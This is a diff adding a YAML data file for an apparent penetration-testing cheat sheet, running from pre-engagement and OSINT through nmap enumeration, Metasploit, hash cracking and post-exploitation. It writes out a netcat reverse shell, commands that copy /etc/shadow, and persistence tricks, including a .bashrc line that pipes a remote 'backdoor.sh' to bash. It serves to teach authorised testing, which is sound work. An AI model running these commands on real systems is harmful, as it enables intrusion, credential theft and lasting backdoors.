@@ -1,0 +1,467 @@
+---
+favorites:
+  text: Favorites
+  txtcolor: "#FFD5A3"
+  bgcolor: "#1E1408"
+  subtxtcolor: "#FF9A47"
+  subbgcolor: "#1E1408"
+  icon: mdi-star-outline
+  alias:
+    text: Aliases
+    icon: mdi-text-short
+    exegol:
+      title: Exegol
+      icon: mdi-alpha-e-box
+      desc: |
+        ```bash
+        -                           ## cd - (last directory)
+        _                           ## sudo
+        a                           ## arsenal
+        egrep                       ## grep -E
+        exh                         ## exegol history
+        hcat file.txt               ## Detects hashtype, lunches hacat with fzf-wordlists
+        http-put-server             ## ???
+        http-server 8080            ## python3 http.server
+        md                          ## mkdir -p 
+        scan-range  10.10.10.0/24   ## nmap -T5 -n -sn 10.10.10.0/24
+        ``` 
+  usefull_commands:
+    text: usefull commands
+    icon: mdi-console
+    linux:
+      title: Linux
+      icon: mdi-penguin
+      desc: |
+        ```bash
+        ## Send a file via netcat
+        nc -q 0 $IP $PORT < /my/file.txt      ## Reciever
+        netcat -lp $PORT > file.txt           ## Sender
+        ```
+        ```bash
+        ## .ssh/config
+        Host BUR
+          Hostname 10.10.10.20
+          User root
+          IdentityFile /workspace/loot/10.10.10.20/sshprivkey
+        
+        ## Connect via ssh
+        ssh BUR | scp BUR:/etc/shadow .
+        ```
+
+
+tooling:
+  text: Prepare your tools
+  txtcolor: "#9CCBFF"
+  bgcolor: "#0B1620"
+  subtxtcolor: "#4C90DA"
+  subbgcolor: "#0B1620"
+  icon: mdi-tools
+  environnement:
+    text: Environnement
+    icon: mdi-clock-start
+    exegol:
+      title: Exegol
+      icon: mdi-computer
+      desc: |
+        # Exegol on Linux or Windows
+        1) Install [Debian](https://www.debian.org/distrib/) or [Wsl](https://learn.microsoft.com/en-us/windows/wsl/install)
+        2) Follow the documentation to [install](https://docs.exegol.com/first-install)
+        3) *Optionnal : Customize your Exegol*
+        
+        ⚠️ If using WSL, **SET network as `mirrored` instead** of NAT to get direct access to the same subnet
+    kali:
+      title: Kali-Linux
+      icon: mdi-computer
+      desc: |
+        > Install from [kali.org](https://www.kali.org/)
+  reporting:
+    text: Reporting tools
+    icon: mdi-lead-pencil
+    report:
+      title: Reporting tools & templates
+      icon: mdi-lead-pencil
+      desc: |
+        TODO
+    snipping:
+      title: Screenshots - FlameShot
+      icon: mdi-camera-enhance
+      desc: |
+        [FlameShot](https://flameshot.org/)
+        > Shortcut to use is **`TODO`**
+    
+Pentest:
+  text: Penetration Testing
+  txtcolor: "#B9F5C9"
+  bgcolor: "#0C160F"
+  subtxtcolor: "#72D38D"
+  subbgcolor: "#0C160F"
+  icon: mdi-shield-search
+  pre-engagement:
+    text: Pre-engagement
+    icon: mdi-clock-start
+    scope:
+      title: Define client's scope and goals
+      icon: mdi-flag-checkered
+      desc: |
+        # First contact with the client 
+        - Objectives
+        - reasons to perform the test
+        - expectations
+        
+        This step is important since your **understanding** must align with the clients **expectations** to avoid **frustration** and **inefficiency**
+    cost-estimation:
+      title: Pricing estimate
+      icon: mdi-cash-multiple
+      desc: |
+        # **Estimate** time and cost
+        - Number of servers
+        - VLANs
+        - Include workstations, PLCs, other équipements, infra, web or apps...
+    roe:
+      title: Rules of engagement
+      icon: mdi-progress-check
+      desc: | 
+        # Includes
+        - **OBJECTIVES** (Access, compomission, file extraction...)
+        - Scope
+        - Range, exclusions, prtected assets
+        - Emergency contacts
+        - Worst case actions / procédures
+        
+        ⚠️ **Do not forget to add exclusions, contacts, emergency response, scope...**
+    contract:
+      title: Contract
+      icon: mdi-file-sign
+      desc: | 
+        # Method
+        - Describe both parties (names, addresses, company)
+        - Definie each part as in the rules of engagement (duration, scope, exclusions, emergency procedures...)
+        - Link the RoE document
+        - Add emergency contact information
+    kick-off:
+      title: Kick-off meeting
+      icon: mdi-account-group
+      desc: | 
+        # Objectives
+        - Validate the rules of engagement
+        - Confirm contact informations
+        - Confirm worst-case scenarios
+        - Validate last détails of no importance (workspace, conditions, last additions)
+  recon:
+    text: Reconnaissance
+    icon: mdi-radar
+    osint:
+      title: Identify public information via OSINT
+      icon: mdi-magnify
+      desc: |
+        Use multiple online tools to gather informations (domains, IPs, Saas Apps, mail data...)
+        - github list of many ressources (https://github.com/jivoi/awesome-osint)
+        - google.com (+ google dorks) [GHDB on exploit-db](https://www.exploit-db.com/google-hacking-database)
+          - `site:` | `filetype:` | `intitle:` | ...
+          - `ext:pdf` file extention
+          - `filetype:xlsx ("employee" OR "staff") site:target.com` | `site:*.dom.com -site:www.dom.com -site:dom.com`
+        - Enumerate subdomains [c99.nl](https://subdomainfinder.c99.nl) ou [pentest-tools.com](https://pentest-tools.com/information-gathering/find-subdomains-of-domain)
+        - ❗CertData permet d'énumérer les différents sous-domaines [crt.sh](https://crt.sh/)
+        - ❗Get e-mails from google, twitter or Linkedin to get potential windows domain [Twitter without account](https://nitter.net/) 
+        - Whois (to get IP, contact information) [WhoIs](https://www.whois.com/whois/)
+        - Mail server information [MxToolbox](https://mxtoolbox.com/) 
+          - **SPF** allows only certain IPs to send emails `absent record => spoofed mail goes to inbox` | `~all => inbox or spam`
+          - **DKIM** signs mail header to check integrity
+          - **DMARK** tells servers how to handle emails that fail `SPF` or `DKIM` (alert, reject...)
+        - Exposed services on the internet [Shodan](https://www.shodan.io/) - [Cencys](https://search.censys.io/)
+        - Metadata on files and pictures using `exiftool`
+        - Use tools like TheHarvester, Maltego, Recon-NG... (Siderfoot)
+    leakdb:
+      title: Leak databases
+      icon: mdi-pipe-leak
+      desc: |
+        > ⚠️ keeping those databases locally is **ILLEGAL** in France as it is considered as "recel de données (Article 321-1 du Code Pénal)"
+        Use leak databases available online to check if accounts are not already compromised
+        - Leaked password [HaveIBeenPawned](https://haveibeenpwned.com/) - [Dehashed](https://dehashed.com/search)
+        - Known DB are 
+          - `Collection #1` - 770M entries (2019)
+          - `COMB` - Combination of 3.2B entries (2021)
+          - Nitro PDF - 77M entries (2020)
+        - [intelx.io](https://intelx.io) - [dehashed.com](https://app.dehashed.com/search) - mega.nz - Telegram       
+  enumeration:
+    text: Enumeration
+    icon: mdi-list-box-outline
+    network:
+      title: Network mapping with netdiscover & nmap
+      icon: mdi-network
+      desc: |
+        > uses ARP to gather IPs on the spécified range (only works on the same boradcast domain (same subnet))
+       
+        ```bash
+        ## create a list of target IPs in target_ips.txt
+        netdiscover -r $TARGET -P > netdiscover_arp.txt
+        grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' netdiscover_arp.txt > target_ips.txt
+        cat target_ips.txt
+        ```  
+        ```bash
+        ## Same with nmap > will include host's IP)
+        nmap -n -sn $TARGET -oG - | awk '/Up$/{print $2}'  > target_ips.txt
+        cat target_ips.txt
+        ```
+        ```bash
+        ## Use DNS résolution
+        nmap -sn $TARGET -oG - --dns-servers $DNSIP
+        ```
+    protocols:
+      title: Protocol Enumeration using nmap
+      icon: mdi-protocol
+      desc: |
+        # NMAP MOST USED OPTIONS
+        - Exemples
+        ```bash
+        # Global nmap scan conveted to HTML format
+        nmap -sT -p- -sV -A -O -iL target_ips.txt -oX nmap_scan_result.xml
+        xsltproc nmap_scan_result.xml -o nmap_scan_result.html
+
+        # SQl related scripts
+        nmap --script mysql* -p 3306 $TARGET
+
+        # Discovery script
+        nmap --script discovery $TARGET
+
+        # Bruteforce FTP
+        nmap $TARGET --script ftp-brute --script-args timeout=5,passdb=passlsit.txt,userdb=users.txt
+
+        nmap -A $TARGET      # -sV -O -sC --traceroute` (Os + Version + Default scripts)
+        ```
+        - Scan options
+        > `-sN` : Ping scan - Disable port scanning - Host discovery only
+          `-sT` : **T**CP scan - Full-open scan (SYN > SYN/ACK - ACK)
+          `-sS` : **S**YN scan - Half-open scan (SYN > SYN/ACK - RST)
+          `-sU` : **U**DP scan - Essential for finding DNS, SNMP, DHCP (less reliable)
+          `-sN` : **N**ull scan (zéro flag)
+          `-sX` : **X**mas scan (URG / PUSH / FIN) - Tries to limit detection
+          `-sV` : **V**ersion scan - Banner grabbing (Finds versions of OS and services)
+          `-sC` : S**c**ript scan - (by default)
+        - Output options
+        > `-oX` : xml (to html via `xsltproc scan.xml -o scan.html`)
+          `-oG` : grepable `- | scan.txt` (`-` ouptuts to terminal )
+          `-T4` : **T**iming template ~aggressivness ❗ `-T4-5` can DDOS the equipement and trigger EDR
+          `-iL` : **i**nput **L**ist - use a list of IPs to target instad of a range
+          `-Pn` : **Ping** **n**o (no ping) - skips host discovery (when firewall drops echos)
+        - Other options
+        > `-O` : for OS detection
+          `-p` : Port to scan `-p` (top 1000) | `-P-` (all 65535) | `-p T:1-10 U:35,43` (ranges for TCP/UDP) | `--top-ports 20` (top 20)
+    smbshares:
+      title: SMB shares
+      icon: mdi-folder-network-outline
+      desc: |
+        ```bash
+        # smbmap is used to lsit shares and rights for the user
+        smbmap --host-file target_ips.txt             # Show share for a set of targets
+        smbmap -R -H $HOST                            # Show shares Recursively for a single host
+        smbmap -R share -H $HOST -A password.txt -q   # search for password.txt recursively and download it
+        smbmap -u anonymous -H $HOST                  # Connecet anonymously to the share
+
+        ## Or with NMAP (will display forest, domain, OS version...)
+        nmap -Pn -sC -p 445 $TARGET
+        ```
+    rpc:
+      title: RPC (Remote Procedure Call) - WINDOWS only
+      icon: mdi-remote-desktop
+      desc: |
+        ```bash
+        rpcclient -U '' -N $TARGET     ## Using rpcclient
+        enum4linux-ng $TARGET          ## Gives A LOT of info (domain, OS version...)
+
+        ## NOTE : This part is incomplete and needs to get more info
+        ```        
+    nfs:
+      title: Partages NFS
+      icon: mdi-nativescript
+      desc: |
+        ```bash
+        showmount -e $TARGET        ## Query a server about all EXPORTED directories via NFS (via RPC)
+        nmap $HOST --script nfs*    ## nmap once again...
+
+        ## NOTE : This part is incomplete and needs to get more info
+        ```        
+    snmp:
+      title: SNMP (Simple Network Management Protocol)
+      icon: mdi-target-variant
+      desc: |
+        ```bash
+        snmp-check $TARGET | more            ## Query a server about all EXPORTED directories via NFS (via RPC)
+        nmap $TARGET -sU -p 161 -sC -sV      ## nmap once again...
+        ```        
+    eyewitness:
+      title: Web interfaces
+      icon: mdi-web
+      desc: |
+        ```bash
+        eyewitness --web -x -scan.xml -d ./webscan     ## Query a server about all EXPORTED directories via NFS (via RPC)
+        nmap -p 80,443,8080 -sV -oX scan.xml $TARGET   ## nmap command to generate a xml report about web interfaces
+
+        ## NOTE : This part has not fully been tested
+        ```        
+    vuln:
+      title: Scan the sytem for vulnérabilities
+      icon: mdi-radar
+      desc: |
+        > Use ready tools like [Nessus](https://fr.tenable.com/products/nessus) or [OpenVAS](https://www.openvas.org/)`
+        ```bash
+        ## OR... Use Nmap script vulener
+        nmap -sT -p- -A -v -iL target_ips.txt -T4 --script vuln -oX result_nmap_vulners.xml
+        xsltproc result_nmap_vulners.xml -o result_nmap_vulners.html
+        ```             
+  exploit:
+    text: Exploit
+    icon: mdi-list-box-outline
+    references:
+      title: References
+      icon: mdi-bookshelf
+      desc: |
+        > THE reference is [ExploitDB](https://www.exploit-db.com/)
+
+        You can find other PoCs via google on [GitHub](https://github.com/) iva dorks `site:github.com "exploit" smbghost V3`
+        ❗Be sure to read the code since more and more malicious code is being uploaded
+    searchsploit:
+      title: SearchSploit
+      icon: mdi-text-search
+      desc: |
+        ⚠️ Check stability of the exploit and check it against the target criticity in production environnement
+        ```bash
+        searchsploit ms17-010 eternalblue | grep "2012R2"       ## Search for exploit
+        searchsploit -m /path/to/module)                        ## fetch exploit before use
+        head -n 10 ./module.py                                  ## to get how the module works
+        ``` 
+    frameworks:
+      title: Exploitation frameworks
+      icon: mdi-alpha-m-circle
+      desc: |
+        Most known ones are [Cobalt Strike (paid)](https://www.cobaltstrike.com) and [Metasploit](https://www.metasploit.com/)
+        > Metaploit CheatSheet [HERE](LINK TO FIND)
+        ```bash
+        ## METASPLOIT
+        msfconsole                              # Lunch MSF console
+        search type:payload platform:windows    # search types of payloads (what to do once the vulnerability is successfull)
+        search ms17                             # search for a specific vulnérability / software / type (add user, download vbs file...)
+        info 10                                 # show info regarding module 10 from the 
+        options                                 # Show exploit options
+        show targets                            # Show possible targets
+        set target 1                            # change target
+        ```
+        ```bash
+        ## METERPRETER commands
+        help                                    ## see options
+        ...                                     # Did not have time to push further
+        pwd | ls | mic action | webcam action...
+        ```
+        ```bash
+        ## LANAGING
+        sessions                   # list sessions
+        session 1                  # interact with session1
+        background                 # (while in session) back to msf console (Only with meterpreter ???)
+        ```
+    shells:
+      title: Shells and reverse shells
+      icons: mdi-console-line
+      desc: |
+        ```bash
+        ## Bind shells (user to victim) / Reverse shell (Victim > tester)
+        ### ATACKER                          ## VICTIM
+        netcat -lvp $PORT                    nc $ATTACKIP $PORT -e /bin/bash
+        
+        ## Upgrade to TTY ou Pseudo TTY
+        python -c 'import pty;pty.spawn("/bin/bash")'      ## Upgrade to TTY if python is available
+
+        ## Send a file
+        netcat -lp $PORT > file.txt          ## nc -q 0 $IP $PORT < /my/file.txt
+        ```
+    hashid:
+      title: Identify a Hash
+      icon: mdi-format-header-pound
+      desc: |
+        ```bash
+        hashid $MYHASH         ## Identify Hash type
+        hashid -j -m $MYHASH   ## Identify modes for John (-j) and HashCat (-m) - needs pip install hashid
+        ```
+    hashcat:
+      title: HashCat
+      icon: mdi-cat
+      desc: |
+        ```bash
+        ## Dictionnary attacks
+        hashcat -m 0 -a 0 hash_list.txt wordlist.txt --force
+        hashcat -m 0 -a 0 hash_list.txt `fzf-wordlists`            ## EXEGOL
+        hcat hash_list.txt                                         ## Detects => Select => Start 😊
+
+        ## Bruteforce  > Applies a rule to the wordlist
+        wget https://github.com/stealthsploit/OneRuleToRuleThemStill/raw/refs/heads/main/OneRuleToRuleThemStill.rule
+        hashcat -m 1000 hash.txt ..\rockyou.txt -r OneRuleToRuleThemStill.rule --debug-mode=1 --debug-file=matched.rule
+        ## TODO > Check this (did not work with a simple MD5 HASH)
+        ```
+    john:
+      title: John (The Ripper)
+      icon: mdi-coffin
+      desc: |
+        ```bash
+        ## TODO
+        ```
+    dictionnary:
+      title: Create your dictionnary
+      icon: mdi-book-alphabet
+      desc: |
+        ```bash
+        cewl -w dico.txt https://www.domain.com -d 3 -m 6   ## Generates a NEW dict by crawling the website 3 links depth, word 5 chars min
+        cewl -options >> list.txt                           ## Add data to the file
+
+        cupp.py -q -i                                       ## Interactive generation of dict without a banner (--quiet)
+        cupp.py -w my-wordlist .txt                         ## Applies cup logic to a wordlist
+        ```   
+  post-exploit:
+    text: Post-Exploitation
+    icon: mdi-account-hard-hat-outline
+    juicydata:
+      title: Look for juicy data
+      icon: mdi-glass-cocktail
+      desc: |
+        > Use [LinPEASS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [WinPEASS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+        ```bash
+        ## Get low hanging fruits in Linux
+        egrep -ri 'pass|10\.10\.10\.' /                           ## Search for 'pass' or '10.10.10.' in any file recursively
+        alias                                                     ## list aliases
+        sudo -L                                                   ## check what I can do as root...
+            ## NOPASSWD: /bin/cat /share/a/back/*   
+            sudo cat /share/a/back/../../../../etc/shadow         ## path truncation
+        history                                                   ## Check users history
+        ls /home/                                                 ## check users
+        ls ~/.ssh                                                 ## find Keys (can also look for "PRIVATE" via egrep)
+        dpkg -l | apt list                                        ## List installed softwares
+        find / -perm /u=s,g=s -type f                             ##find biraries with SUID
+        ```   
+        ```bash   
+        ## In Windows via Powershell   
+        Get-Children -Recurse | select-String -Pattern 'Pass'     ## Using PowerShell
+        systeminfo                                                ## Get OS system
+        wmic product get name,version                             ## List softwares
+        ```
+    gtfobins:
+      title: GTFObins
+      icon: mdi-gift-open-outline
+      desc: |
+        > [GTFOBins](https://gtfobins.github.io/)
+    persistance:
+      title: Persistance
+      icon: mdi-home-lock
+      desc: |
+        # Windows
+        - Windows RegKey
+          `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+          => Add Name=invisible Type=REG_SZ Data=C:\Path\to\payload.exe
+          **HKLM** = system boot - **HKCU** = Current User session start
+        - TaskScheduler
+          `schtask /create /sc ONLOGON /tn "CheckUpdate" /tr "C:\path/to/bin.exe" -ru "SYSTEM"`
+        # Linux
+        ```bash
+        echo "Public_SSH_Key" >> .ssh/authorized_keys                     ## Add you own public key to authorized user Keys
+        echo "curl https://c2cserver.fr/backdoor.sh | bash" >> .bashrc    ## Loads Everytime theuser opens a session
+        ```
+        
+
+
